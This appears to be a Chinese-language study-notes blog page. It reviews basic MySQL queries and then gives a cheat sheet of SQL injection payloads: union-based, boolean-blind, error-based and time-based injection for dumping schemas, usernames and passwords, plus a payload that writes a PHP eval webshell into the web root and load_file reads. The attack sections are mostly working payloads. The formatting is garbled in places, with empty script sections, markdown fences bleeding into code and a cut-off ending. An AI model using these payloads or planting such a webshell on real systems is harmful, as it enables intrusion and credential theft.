<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">select</span> </span><br><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>，字段<span class="number">2</span>，...... <span class="keyword">from</span> <span class="operator">+</span> 表名 <span class="keyword">where</span> <span class="operator">+</span> 条件;</span><br><span class="line"></span><br><span class="line"># <span class="keyword">between</span> <span class="keyword">and</span> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">2</span> <span class="keyword">and</span> <span class="number">8</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&gt;=</span><span class="number">2</span> <span class="keyword">and</span> id <span class="operator">&lt;=</span><span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"># <span class="keyword">in</span>   <span class="keyword">not</span> <span class="keyword">in</span></span><br><span class="line"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">not</span> <span class="keyword">in</span>(<span class="number">5</span>,<span class="number">8</span>);</span><br><span class="line">指查找出 id不等于<span class="number">5</span> 和 id不等于<span class="number">8</span> 的用户的密码</span><br><span class="line">注：不是 <span class="number">5</span><span class="operator">~</span><span class="number">8</span>，<span class="keyword">in</span>之后不是一个区间 </span><br><span class="line"></span><br><span class="line"># <span class="keyword">like</span></span><br><span class="line"><span class="number">1.</span><span class="operator">%</span> 代表任意多个字符</span><br><span class="line"><span class="number">2.</span>_ 代表任意一个字符</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%b%&#x27;</span>;</span><br><span class="line">指查找出用户名中带有字母b的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;_a%&#x27;</span>;</span><br><span class="line">指查找出用户名中带第二个字母为a的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%b&#x27;</span>;</span><br><span class="line">指查找出用户名中带最后一个字母为b的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%\_%&#x27;</span>;</span><br><span class="line">指查找出用户名中带有下划线_的用户名</span><br><span class="line">注：特殊字符需要转义</span><br><span class="line"></span><br><span class="line"># <span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名；</span><br><span class="line">注：默认为升序排列</span><br><span class="line">指定升序：<span class="keyword">asc</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名 <span class="keyword">asc</span>；</span><br><span class="line">指定降序：<span class="keyword">desc</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名 <span class="keyword">desc</span>；</span><br><span class="line">双重需求：</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名<span class="number">1</span> <span class="keyword">desc</span>,字段名<span class="number">2</span> <span class="keyword">asc</span>；</span><br><span class="line"></span><br><span class="line"># 分组函数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"></span><br><span class="line"># 空处理函数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(ifnull(salary,<span class="number">0</span>)<span class="operator">*</span><span class="number">12</span>), <span class="keyword">from</span> crew;</span><br><span class="line">求一年的薪水之和，当薪水为<span class="keyword">NULL</span>时，被当作<span class="number">0</span>来处理</span><br><span class="line"></span><br><span class="line"># <span class="built_in">count</span>(<span class="operator">*</span>) 与 count</span><br><span class="line"><span class="built_in">count</span>(<span class="operator">*</span>) :统计总记录条数，而不是统计某个字段中的数据，与字段无关</span><br><span class="line"><span class="built_in">count</span>(具体的某个字段)：统计具体字段中不为<span class="keyword">NULL</span>的总数</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>字符串数据 sum,avg 为 <span class="number">0</span>，max,min 按字母大小取</span><br><span class="line"><span class="number">2.</span>分组函数会自动忽略 <span class="keyword">NULL</span></span><br><span class="line"><span class="number">3.</span>数学运算 中如果有<span class="keyword">NULL</span>参与，结果为定为<span class="keyword">NULL</span></span><br><span class="line"><span class="number">4.</span>分组函数不能直接出现在 <span class="keyword">where</span> 后面，原因是 <span class="keyword">group</span> <span class="keyword">by</span> 是在<span class="keyword">where</span>语句执行结束之后执行的</span><br><span class="line"><span class="number">5.</span>分组函数可组合使用</span><br><span class="line"></span><br><span class="line"># <span class="keyword">group</span> <span class="keyword">by</span> 与 <span class="keyword">having</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>：按照某个字段或某些字段进行分组</span><br><span class="line"><span class="keyword">having</span>：对分组之后的数据进行再次过滤，即<span class="keyword">having</span> 必须跟在 <span class="keyword">group</span> <span class="keyword">by</span> 后面使用</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> classes;</span><br><span class="line">先根据班级分组，再查出各个班级的成绩最高学生的成绩</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>分组函数一般与 <span class="keyword">group</span> <span class="keyword">by</span> 联合使用，并且任何一个分组函数（count,sum,avg,max,min）都是在 <span class="keyword">group</span> <span class="keyword">by</span> 语句执行结束后才会执行</span><br><span class="line"><span class="number">2.</span>当一条<span class="keyword">sql</span>语句没有 <span class="keyword">group</span> <span class="keyword">by</span> 时，整张表会自成一组</span><br><span class="line"><span class="number">3.</span>当<span class="keyword">sql</span>语句中使用<span class="keyword">group</span> <span class="keyword">by</span>时，<span class="keyword">select</span>之后只能跟参与分组的字段或者分组函数</span><br><span class="line">注：实际上在 mysql 中，可以使用并且执行，但毫无意义；而由于 Oracle 比 Mysql 要更加严格，在 Oracle 中是绝对严格不能使用的。</span><br><span class="line"></span><br><span class="line"># <span class="keyword">distinct</span> 去重</span><br><span class="line"><span class="keyword">distinct</span> 关键字  去除重复记录</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> job <span class="keyword">from</span> company;</span><br><span class="line">查询该公司中的工作岗位</span><br><span class="line"></span><br><span class="line"># 语句执行顺序</span><br><span class="line"><span class="keyword">select</span>     <span class="number">5</span>号：挑选出满足条件的数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>       <span class="number">1</span>号：定表</span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span>      <span class="number">2</span>号：过滤原始数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>   <span class="number">3</span>号：进行分组</span><br><span class="line"> 	</span><br><span class="line"><span class="keyword">having</span>     <span class="number">4</span>号：对数据进行再次过滤</span><br><span class="line"></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>   <span class="number">6</span>号：进行排序</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># inner join</span></span><br><span class="line">select a.ename,b.dname from emp a join dept b on a.deptno=b.deptno;</span><br><span class="line"></span><br><span class="line"><span class="comment"># left/right join</span></span><br><span class="line">select dname,ename from dept a left join emp b on a.deptno=b.deptno;</span><br></pre></td></tr></table></figure>

<h2 id="四、union-联合注入-单引号闭合字符型为例"><a href="#四、union-联合注入-单引号闭合字符型为例" class="headerlink" title="四、union 联合注入(单引号闭合字符型为例)"></a>四、union 联合注入(单引号闭合字符型为例)</h2><p>注入判断</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>order by 查列</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; order by x--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> order by x<span class="comment">#</span></span><br><span class="line"><span class="comment"># 其中x输入数字代表哪一列，使用二分法缩小范围,x之后是两个减号与加号，代表注释</span></span><br></pre></td></tr></table></figure>

<p>判断回显位置，三列为例</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string">?id=0&#x27;</span> union select 1,2,3--+</span><br><span class="line">?id=1<span class="string">&#x27; and 1=2 union select 1,2,3--+</span></span><br><span class="line"><span class="string"># 前面是为了否定 id=1 时的回显，防止人家的 sql 语句只 limit 0,1 </span></span><br><span class="line"><span class="string"># 这样就无法查看到我们想要的信息了</span></span><br></pre></td></tr></table></figure>

<p>回显位置注入 sql 语句</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select database()),3--+</span></span><br></pre></td></tr></table></figure>

<p>查库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+</span></span><br></pre></td></tr></table></figure>

<p>查某一个库中的表</p>
<p><code>注意：仅仅是查当前数据库 database() 的表，由于处于当前数据库下，是不能查看其它数据库中数据的</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure>

<p>查列</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.collumns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure>

<p>查内容，<code>~</code> 连接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(concat_ws(&#x27;</span>~<span class="string">&#x27;,username,password))from security.users),3--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 同时查三列数据的话</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union select 1,group_concat(id,<span class="string">&#x27;--&#x27;</span>,username,<span class="string">&#x27;--&#x27;</span>,password),3 from users<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="五、Boolean-盲注"><a href="#五、Boolean-盲注" class="headerlink" title="五、Boolean 盲注"></a>五、Boolean 盲注</h2><h3 id="5-1-手动：结合-Burp-爆破进行"><a href="#5-1-手动：结合-Burp-爆破进行" class="headerlink" title="5.1 手动：结合 Burp 爆破进行"></a>5.1 手动：结合 Burp 爆破进行</h3><p>查数据库长度</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and length(database())=1--+</span></span><br><span class="line"><span class="string"># 爆破数字 1</span></span><br></pre></td></tr></table></figure>

<p>判断库名组成     security</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and left(database(),1)=&#x27;</span>a<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 爆破字母 a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and ascii(substr(database(),1,1))=<span class="string">&#x27;b&#x27;</span>--+</span><br><span class="line"><span class="comment"># 爆破 ascii 值 b</span></span><br></pre></td></tr></table></figure>

<p>查表         users</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit a,1),1,1)) =&#x27;</span>b<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 同时爆破数字a,和 数字b，其中 b 是 ascii 值</span></span><br></pre></td></tr></table></figure>

<p>查列        username   password</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and ascii(substr((select column_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; limit a,1),1,1)) = &#x27;</span>b<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 同时爆破数字a,和 数字b，其中 b 是 ascii 值</span></span><br></pre></td></tr></table></figure>

<p>查内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and ascii(substr((select username from security.users limit a,1),1,1))=&#x27;</span>b<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 爆破 ascii 值 b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and ascii(substr((select password from security.users <span class="built_in">limit</span> 0,1),1,1))=<span class="string">&#x27;b&#x27;</span>--+</span><br><span class="line"><span class="comment"># 爆破 ascii 值 b</span></span><br></pre></td></tr></table></figure>

<h3 id="5-2-脚本"><a href="#5-2-脚本" class="headerlink" title="5.2 脚本"></a>5.2 脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="六、五大报错注入"><a href="#六、五大报错注入" class="headerlink" title="六、五大报错注入"></a>六、五大报错注入</h2><p><strong>利用条件</strong>：页面回显 SQL语句执行的错误信息，例如 <code>mysql_error()</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="built_in">floor</span>()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>  (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span>  information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># extractvalue()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()))))</span><br></pre></td></tr></table></figure>

<p><strong>updatexml()</strong> 函数：</p>
<p>这个函数的第二个参数本应该是合法的 <code>XPATH</code> 路径，否则就会在引发报错的同时将传入的参数进行输出。我们利用这个特征，当题目存在回显时，将我们想的到的信息传入这个函数的第二个参数即可查询。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># updatexml()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">0x3a</span>,concat(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="built_in">exp</span>()</span><br><span class="line">id <span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">EXP</span>(<span class="operator">~</span>(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 六种函数 (使用方法相同)</span><br><span class="line"></span><br><span class="line">GeometryCollection()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> GeometryCollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">polygon()</span><br><span class="line">id <span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multipoint()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">linestring()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> LINESTRING((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multipolygon()</span><br><span class="line">id <span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure>

<h2 id="七、文件读写"><a href="#七、文件读写" class="headerlink" title="七、文件读写"></a>七、文件读写</h2><h3 id="7-1-手动"><a href="#7-1-手动" class="headerlink" title="7.1 手动"></a>7.1 手动</h3><p><strong>写文件</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,&quot;&lt;?php @eval(\$_POST[1]); ?&gt;&quot;,3 into outfile &quot;/var/www/html/1.php&quot;--+</span></span><br><span class="line"><span class="string"># 可将文件内容转换成十六进制</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union select 1,0x3c3f70687020406576616c28245f504f53545b315d293b203f3e,3 into outfile <span class="string">&quot;/var/www/html/1.php&quot;</span>--+</span><br></pre></td></tr></table></figure>

<p><strong>有回显时 读取文件</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,2,load_file(&#x27;</span>/var/www/html/1.php<span class="string">&#x27;)--+</span></span><br><span class="line"><span class="string"># 文件路径 可使用 十六进制</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union select 1,2,load_file(0x2f7661722f7777772f68746d6c2f312e706870)--+</span><br></pre></td></tr></table></figure>

<p><strong>无回显 盲注读取文件</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; and ascii(mid((select hex(load_file(&#x27;</span>/var/www/html/1.php<span class="string">&#x27;))),a,1))&gt;b--+</span></span><br><span class="line"><span class="string"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure>

<h3 id="7-2-脚本"><a href="#7-2-脚本" class="headerlink" title="7.2 脚本"></a>7.2 脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 八、延时注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 8.1 手动：结合 Burp Respond</span></span><br><span class="line"></span><br><span class="line">当页面上无回显，也没有输出 SQL 语句执行错误信息。正确的 SQL 语句和错误的 SQL 语句返回页面都一样，可考虑延时注入。</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">?id=1<span class="string">&#x27; and sleep(3)--+</span></span><br></pre></td></tr></table></figure>

<p>查库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(length(database())=a,sleep(3),1)--+</span></span><br><span class="line"><span class="string"># 爆破数字 a</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and <span class="keyword">if</span>(ascii(substr(database(),a,1))=b,sleep(3),1)--+</span><br><span class="line"><span class="comment"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure>

<p>查表</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),a,1))=b,sleep(3),1)--+</span></span><br><span class="line"><span class="string"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure>

<p>查列</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27;),a,1))=b,sleep(3),1)--+</span></span><br><span class="line"><span class="string"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure>

<p>查字段</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(ascii(substr((select group_concat(username) from security.users),a,1))=b,sleep(3),1)--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and <span class="keyword">if</span>(ascii(substr((select group_concat(password) from security.users),a,1))=b,sleep(3),1)--+</span><br><span class="line"><span class="comment"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure>

<h3 id="8-2-脚本"><a href="#8-2-脚本" class="headerlink" title="8.2 脚本"></a>8.2 脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 九、regexp 正则匹配</span></span><br><span class="line"></span><br><span class="line">测试</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;b$&#x27;</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span 